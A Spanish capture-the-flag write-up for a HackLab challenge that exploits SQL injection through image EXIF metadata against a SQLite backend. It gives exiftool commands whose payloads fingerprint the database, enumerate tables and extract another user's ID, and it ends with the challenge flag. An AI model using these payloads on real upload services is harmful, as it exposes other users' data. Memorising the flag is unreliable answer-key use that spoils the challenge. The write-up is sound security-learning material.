# Desafío 27 - Mis viajes

**Plataforma:** HackLab (SoftwareSeguro)  
**Categoría:** SQL Injection  

## Análisis

Similar al desafío 20, la inyección SQL se realiza vía metadatos EXIF sobre un backend SQLite. En este caso el objetivo es encontrar el `user_id` de otro usuario con imágenes subidas.

Formato de ID del usuario: `d6ac9cd7-03d8-4a95-a73f-41a02f09d210`

## Explotación

Primero se verifica el motor de base de datos:

```bash
exiftool -Make="',(SELECT sqlite_version())) --" -Model="payload_model" test.jpg_original
```

Resultado: versión `3.40.1` → SQLite.

![Desafío 27 - Mis viajes - imagen 1](assets/01.png)

![Desafío 27 - Mis viajes - imagen 2](assets/02.png)

![Desafío 27 - Mis viajes - imagen 3](assets/03.png)

![Desafío 27 - Mis viajes - imagen 4](assets/04.png)

![Desafío 27 - Mis viajes - imagen 5](assets/05.png)

Se enumeran las tablas de `sqlite_master`:

```bash
exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 0)||'" test.jpg_original
exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 1)||'" test.jpg_original
```

![Desafío 27 - Mis viajes - imagen 6](assets/06.png)

```bash
exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 2)||'" test.jpg_original
exiftool -Make="'||(SELECT sql FROM sqlite_master WHERE name='images')||'" test.jpg_original
```

![Desafío 27 - Mis viajes - imagen 7](assets/07.png)

Se obtiene el `user_id` de la tabla `images`:

```bash
exiftool -Make="'||(SELECT user_id FROM images LIMIT 1)||'" test.jpg_original
```

ID encontrado:

```
1089b4a3-b6d0-450d-9c8a-b120b30bcb04
```

![Desafío 27 - Mis viajes - imagen 8](assets/08.png)

![Desafío 27 - Mis viajes - imagen 9](assets/09.png)

Se copia el ID del usuario y se envía al endpoint correspondiente.

![Desafío 27 - Mis viajes - imagen 10](assets/10.png)

![Desafío 27 - Mis viajes - imagen 11](assets/11.png)

## Flag

```
878c14bbd5cd0127b86fd8dac1d55c4d
```
